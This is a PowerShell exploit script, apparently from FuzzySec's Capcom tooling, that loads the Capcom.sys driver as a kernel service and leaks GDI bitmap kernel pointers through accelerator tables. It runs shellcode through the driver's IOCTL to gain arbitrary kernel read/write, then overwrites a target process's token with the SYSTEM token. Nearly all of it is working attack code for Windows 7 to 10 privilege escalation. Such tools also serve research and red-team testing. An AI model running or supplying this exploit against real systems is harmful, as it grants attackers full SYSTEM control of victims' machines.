function Stage-gSharedInfoBitmap {
<#
.SYNOPSIS
	Universal Bitmap leak using accelerator tables, 32/64 bit Win7-10 (post anniversary).
.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.EXAMPLE
	PS C:\Users\b33f> Stage-gSharedInfoBitmap |fl
	
	BitmapKernelObj : -7692235059200
	BitmappvScan0   : -7692235059120
	BitmapHandle    : 1845828432
	
	PS C:\Users\b33f> $Manager = Stage-gSharedInfoBitmap
	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
	FFFFF901030FF000
#>

	# Check Arch
	if ([System.IntPtr]::Size -eq 4) {
		$x32 = 1
	}

	function Create-AcceleratorTable {
		[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
		$AccelHandle = [Capcom]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
		$User32Hanle = [Capcom]::LoadLibrary("user32.dll")
		$gSharedInfo = [Capcom]::GetProcAddress($User32Hanle, "gSharedInfo")
		if ($x32){
			$gSharedInfo = $gSharedInfo.ToInt32()
		} else {
			$gSharedInfo = $gSharedInfo.ToInt64()
		}
		$aheList = $gSharedInfo + [System.IntPtr]::Size
		if ($x32){
			$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
			$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc # _HANDLEENTRY.Size = 0xC
			$phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
		} else {
			$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
			$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 # _HANDLEENTRY.Size = 0x18
			$phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
		}

		$Result = @()
		$HashTable = @{
			Handle = $AccelHandle
			KernelObj = $phead
		}
		$Object = New-Object PSObject -Property $HashTable
		$Result += $Object
		$Result
	}

	function Destroy-AcceleratorTable {
		param ($Hanlde)
		$CallResult = [Capcom]::DestroyAcceleratorTable($Hanlde)
	}

	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
		$KernelArray += Create-AcceleratorTable
		if ($KernelArray.Length -gt 1) {
			if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
				Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
				[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
				$BitmapHandle = [Capcom]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # # +4 kb size -lt AcceleratorTable
				break
			}
		}
		Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	}

	$BitMapObject = @()
	$HashTable = @{
		BitmapHandle = $BitmapHandle
		BitmapKernelObj = $($KernelArray[$i].KernelObj)
		BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}

function Load-CapcomDriver {
	param([String]$Path)

	# Driver loading not supported on Win7
	if ($OSMajMin -le 6.1) {
		Write-Output "[!] Automatic driver loading not supported on this OS!`n"
		$Global:DriverNotLoaded = $true
		Return
	}

	# Check if the user is running as Admin
	$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
	if (!$IsAdmin) {
		Write-Output "[!] Administrator privilege is required to create a driver service!`n"
		$Global:DriverNotLoaded = $true
		Return
	}

	if (Get-Service "CapcomRK" -ErrorAction SilentlyContinue) {
		if ((Get-Service "CapcomRK").Status -eq "Stopped") {
			Start-Service -Name CapcomRK |Out-Null
		}
	} else {
		# Uses SC because New-Service doesn't support "type= kernel" (..?)
		IEX $($env:SystemRoot + "\System32\sc.exe create CapcomRK binpath= $Path type= kernel start= demand") |Out-Null
		Start-Service -Name CapcomRK |Out-Null
	}
	
	# Check service status
	$ServiceStatus = (Get-Service "CapcomRK").Status
	if ($ServiceStatus -eq "Running") {
		Write-Output "[+] Capcom service started: CapcomRK"
		Get-Service "CapcomRK" |fl
	} else {
		Write-Output "[!] Something went wrong while creating the Capcom service!`n"
		$Global:DriverNotLoaded = $true
		Return
	}
}

function Get-LoadedModules {
<#
.SYNOPSIS
	Use NtQuerySystemInformation::SystemModuleInformation to get a list of
	loaded modules, their base address and size (x32/x64).
	Note: Low integrity only pre 8.1
.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.EXAMPLE
	C:\PS> $Modules = Get-LoadedModules
	C:\PS> $KernelBase = $Modules[0].ImageBase
	C:\PS> $KernelType = ($Modules[0].ImageName -split "\\")[-1]
	C:\PS> ......
#>

	[int]$BuffPtr_Size = 0
	while ($true) {
		[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
		$SystemInformationLength = New-Object Int
	
		# SystemModuleInformation Class = 11
		$CallResult = [Capcom]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
		
		# STATUS_INFO_LENGTH_MISMATCH
		if ($CallResult -eq 0xC0000004) {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
		}
		# STATUS_SUCCESS
		elseif ($CallResult -eq 0x00000000) {
			break
		}
		# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
		else {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			return
		}
	}

	$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
	$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
	if ([System.IntPtr]::Size -eq 4) {
		$SYSTEM_MODULE_INFORMATION_Size = 284
	} else {
		$SYSTEM_MODULE_INFORMATION_Size = 296
	}

	$BuffOffset = $BuffPtr.ToInt64()
	$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
	$BuffOffset = $BuffOffset + [System.IntPtr]::Size

	$SystemModuleArray = @()
	for ($i=0; $i -lt $HandleCount; $i++){
		$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
		$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
		
		$HashTable = @{
			ImageName = $Cast.ImageName
			ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
			ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
		}
		
		$Object = New-Object PSObject -Property $HashTable
		$SystemModuleArray += $Object
	
		$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
	}

	$SystemModuleArray

	# Free SystemModuleInformation array
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
}

function Bitmap-Write {
	param ($Address, $Value)

	$CallResult = [Capcom]::SetBitmapBits($ManagerBitmap.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
	$CallResult = [Capcom]::SetBitmapBits($WorkerBitmap.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}

function Bitmap-Read {
	param ($Address)

	$CallResult = [Capcom]::SetBitmapBits($ManagerBitmap.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
	[IntPtr]$Pointer = [Capcom]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
	$CallResult = [Capcom]::GetBitmapBits($WorkerBitmap.BitmapHandle, [System.IntPtr]::Size, $Pointer)
	if ($x32Architecture){
		[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
	} else {
		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
	}
	$CallResult = [Capcom]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}

Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct SYSTEM_MODULE_INFORMATION
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		public UIntPtr[] Reserved;
		public IntPtr ImageBase;
		public UInt32 ImageSize;
		public UInt32 Flags;
		public UInt16 LoadOrderIndex;
		public UInt16 InitOrderIndex;
		public UInt16 LoadCount;
		public UInt16 ModuleNameOffset;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		internal Char[] _ImageName;
		public String ImageName {
			get {
				return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
			}
		}
	}

	public static class Capcom
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
			
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
			
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CreateFile(
			String lpFileName,
			UInt32 dwDesiredAccess,
			UInt32 dwShareMode,
			IntPtr lpSecurityAttributes,
			UInt32 dwCreationDisposition,
			UInt32 dwFlagsAndAttributes,
			IntPtr hTemplateFile);
			
		[DllImport("Kernel32.dll", SetLastError = true)]
		public static extern bool DeviceIoControl(
			IntPtr hDevice,
			int IoControlCode,
			byte[] InBuffer,
			int nInBufferSize,
			ref IntPtr OutBuffer,
			int nOutBufferSize,
			ref int pBytesReturned,
			IntPtr Overlapped);
			
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
			int nWidth,
			int nHeight,
			uint cPlanes,
			uint cBitsPerPel,
			IntPtr lpvBits);
			
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
			
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
			
		[DllImport("ntdll.dll")]
		public static extern int NtQuerySystemInformation(
			int SystemInformationClass,
			IntPtr SystemInformation,
			int SystemInformationLength,
			ref int ReturnLength);
			
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
			
		[DllImport("kernel32", SetLastError=true)]
		public static extern IntPtr LoadLibraryEx(
			string lpFileName,
			IntPtr hReservedNull,
			int dwFlags);
			
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
			
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
			
		[DllImport("user32.dll")]
		public static extern IntPtr CreateAcceleratorTable(
			IntPtr lpaccl,
			int cEntries);
			
		[DllImport("user32.dll")]
		public static extern bool DestroyAcceleratorTable(
			IntPtr hAccel);
	}
"@

function Capcom-StageGDI {

	# Check if the Capcom driver is loaded
	$SystemModuleCapcom = Get-LoadedModules |Where-Object {$_.ImageName -Like "*Capcom*"}
	if (!$SystemModuleCapcom) {
		Write-Output "`n[+] Loading Capcom driver.."
		Load-CapcomDriver -Path $($PSScriptRoot + "\..\Driver\Capcom.sys")
		if ($DriverNotLoaded -eq $true) {
			Return
		}
	}

	# Leak BitMap pointers
	$Global:ManagerBitmap = Stage-gSharedInfoBitmap
	$Global:WorkerBitmap = Stage-gSharedInfoBitmap
	
	# Shellcode buffer
	[Byte[]] $Shellcode = @(
		0x48, 0xB8) + [System.BitConverter]::GetBytes($ManagerBitmap.BitmappvScan0) + @( # mov rax,$ManagerBitmap.BitmappvScan0
		0x48, 0xB9) + [System.BitConverter]::GetBytes($WorkerBitmap.BitmappvScan0)  + @( # mov rcx,$WorkerBitmap.BitmappvScan0
		0x48, 0x89, 0x08,                                                                # mov qword ptr [rax],rcx
		0xC3                                                                             # ret
	)

	# Some tricks here
	# => cmp [rax-8], rcx
	[IntPtr]$Pointer = [Capcom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
	$ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
	[System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
	
	$hDevice = [Capcom]::CreateFile("\\.\Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

	if ($hDevice -eq -1) {
		Write-Output "`n[!] Unable to get driver handle..`n"
		Return
	}
	
	# IOCTL = 0xAA013044
	#---
	$InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
	$OutBuff = 0x1234
	[Capcom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null
}

function Capcom-ElevatePID {
    param ([Int]$ProcPID)
 
    # Check our bitmaps have been staged into memory
    if (!$ManagerBitmap -Or !$WorkerBitmap) {
        Capcom-StageGDI
        if ($DriverNotLoaded -eq $true) {
            Return
        }
    }
 
    # Defaults to elevating Powershell
    if (!$ProcPID) {
        $ProcPID = $PID
    }
    
    # _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
    # WARNING offsets are invalid for Pre-RTM images!
    $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
    $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
    switch ($OSMajorMinor)
    {
        '10.0' # Win10 / 2k16
        {
            $UniqueProcessIdOffset = 0x2e8
            $TokenOffset = 0x358          
            $ActiveProcessLinks = 0x2f0
        }
     
        '6.3' # Win8.1 / 2k12R2
        {
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        }
     
        '6.2' # Win8 / 2k12
        {
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        }
     
        '6.1' # Win7 / 2k8R2
        {
            $UniqueProcessIdOffset = 0x180
            $TokenOffset = 0x208          
            $ActiveProcessLinks = 0x188
        }
    }
 
    # Get EPROCESS entry for System process
    $SystemModuleArray = Get-LoadedModules
    $KernelBase = $SystemModuleArray[0].ImageBase
    $KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
    $KernelHanle = [Capcom]::LoadLibrary("$KernelType")
    $PsInitialSystemProcess = [Capcom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
    $SysEprocessPtr = $PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase
    $CallResult = [Capcom]::FreeLibrary($KernelHanle)
    $SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
    $SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
    Write-Output "`n[+] SYSTEM Token: 0x$("{0:X}" -f $SysToken)"
     
    # Get EPROCESS entry for PID
    $NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
    while($true) {
        $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
        if ($NextPID -eq $ProcPID) {
            $TargetTokenAddr = $NextProcess+$TokenOffset
            Write-Output "[+] Found PID: $NextPID"
            Write-Output "[+] PID token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
            break
        }
        $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
    }
     
    # Duplicate token!
    Write-Output "[!] Duplicating SYSTEM token!`n"
    Bitmap-Write -Address $TargetTokenAddr -Value $SysToken
}



